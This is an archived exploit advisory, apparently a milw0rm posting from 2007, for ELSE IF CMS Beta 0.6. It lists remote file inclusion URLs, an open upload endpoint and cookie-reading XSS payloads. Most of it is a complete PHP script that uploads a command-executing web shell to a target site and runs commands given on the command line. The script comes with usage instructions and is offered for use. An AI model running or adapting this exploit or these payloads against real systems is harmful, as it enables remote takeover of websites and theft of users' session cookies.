<html><head><title>ELSE IF CMS 0.6 Multiple Remote Vulnerabilities / Exploit</title></head><pre>ELSEIF CMS
Tested on &quot;Else If version Beta 0.6&quot;

Discovered By : HACKERS PAL
Copy rights : HACKERS PAL
Website : http://www.soqor.net
Email Address : security@soqor.net

These Are Examples ..
iam tiered fetching the injected files :)
Remote File inclusion
elseif/contenus.php?contenus=[Shell]
elseif/utilisateurs/votes.php?tpelseifportalrepertoire=[Shell]
elseif/utilisateurs/espaceperso.php?tpelseifportalrepertoire=[Shell]
elseif/utilisateurs/enregistrement.php?tpelseifportalrepertoire=[Shell]
elseif/utilisateurs/commentaire.php?tpelseifportalrepertoire=[Shell]
elseif/utilisateurs/coeurusr.php?tpelseifportalrepertoire=[Shell]
elseif/moduleajouter/articles/fonctions.php?tpelseifportalrepertoire=[Shell]
elseif/moduleajouter/articles/usrarticles.php?corpsdesign=[Sh3ll]
elseif/moduleajouter/depot/usrdepot.php?corpsdesign[Sh3ll]
elseif/moduleajouter/depot/fonctions.php?tpelseifportalrepertoire=[Shell]
Remote File Upload Ability
elseif/externe/swfupload/upload.php
Xss
example
elseif/utilisateurs/vousetesbannis.php?repertimage=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;&quot;
elseif/utilisateurs/votesresultats.php?elseifvotetxtresultatduvote=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
elseif/moduleajouter/depot/adminforum.php?elseifforumtxtmenugeneraleduforum=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
Full Path
elseif/utilisateurs/votesresultats.php
Upload Exploits:
#!/usr/bin/php -q -d short_open_tag=on
&lt;?
/*
/*   ELSE IF CMS Multiple vulnerabilities
/*  This exploit should allow you to Upload Shell ..
/*            By : HACKERS PAL
/*             WwW.SoQoR.NeT
*/
echo('
/**********************************************/
/*       ELSEIF CMS Shell Upload Exploit         */
/*    by HACKERS PAL &lt;security@soqor.net&gt;     */
/*         site: http://www.soqor.net         */');
if ($argc&lt;4) {
print_r('
/* --                                         */
/* Usage: php '.$argv[0].' host path cmd
/* Example:                                   */
/*    php '.$argv[0].' localhost /freewps/ id
/**********************************************/
');
die;
}
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);
         Function get_page($url)
         {
                  if(function_exists(&quot;file_get_contents&quot;))
                  {
                       $contents = file_get_contents($url);
                          }
                          else
                          {
                              $fp=fopen(&quot;$url&quot;,&quot;r&quot;);
                              while($line=fread($fp,1024))
                              {
                               $contents=$contents.$line;
                              }

                                  }
                       return $contents;
         }
function connect($packet)
{
  global $host, $port, $html;
    $con=fsockopen(gethostbyname($host),$port);
    if (!$con)
    {
      echo '[-] Error - No response from '.$host.':'.$port; die;
    }
  fputs($con,$packet);
    $html='';
    while ((!feof($con)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($con,1);
    }
      GLOBAL $html;
  fclose($con);
}
$i=0;
$data=&quot;&quot;;
function add_data($name,$value,$type=&quot;no&quot;,$filename)
{
         GLOBAL $data,$i;
if($type==&quot;file&quot;)
{
$data.=&quot;-----------------------------7d62702f250530
Content-Disposition: form-data; name=\&quot;$filename\&quot;; filename=\&quot;$name\&quot;;
Content-Type: text/plain
$value
&quot;;
}
elseif($type==&quot;init&quot;)
{
$data.=&quot;-----------------------------7d62702f250530--&quot;;
}
elseif($type==&quot;clean&quot;)
{
$data=&quot;&quot;;
}
else
{
$data.=&quot;-----------------------------7d62702f250530
Content-Disposition: form-data; name=\&quot;$name\&quot;;
Content-Type: text/plain
$value
&quot;;
}

}
$host=$argv[1];
$path=$argv[2];
$cmd=$argv[3];
$port=80;
$cmd=urlencode($cmd);
$p='http://'.$host.':'.$port.$path;
Echo &quot;\n[+] Trying to Upload File&quot;;
$cookie=&quot;Master=HACKERS20%PAL&quot;;
$contents='&lt;?php
$cmd=($_GET[cmd])?$_GET[cmd]:$_POST[cmd];
system($cmd);
?&gt;';
add_data(&quot;soqor.php&quot;,$contents,&quot;file&quot;,&quot;Filedata&quot;);
add_data('','',&quot;init&quot;);
$packet=&quot;POST &quot;.$p.&quot;elseif/externe/swfupload/upload.php?&amp;-269001946=1&amp;-834358190=1 HTTP/1.0\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php?mode=editprofile\r\n&quot;;
$packet.=&quot;Accept-Language: it\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\r\n&quot;;
$packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Cache-Control: no-cache\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n\r\n&quot;;
$packet.=$data;
connect($packet);
$dir=$p.&quot;elseif/image/logodusite/soqor.php&quot;;
       $httml = get_page($dir);
if (eregi(&quot;Cannot execute a blank command&quot;,$httml))
{
   echo &quot;\n[+] Successfully uploaded ...\n[+] Go To http://&quot;.$p.&quot;?cmd=$cmd\n[+] For your own commands.. \n[+] The Result Of The Command\n&quot;;
      Echo get_page($p.&quot;upload/soqor.php?cmd=&quot;.$cmd);
}
else
{
   echo &quot;\n[-] Unable to Upload File\n[-] Exploit Failed&quot;;
}
   echo (&quot;\n/*         Visit us : WwW.SoQoR.NeT           */\n/**********************************************/&quot;);
?&gt;
# WwW.SoQoR.NeT

# milw0rm.com [2007-10-06]</pre></html>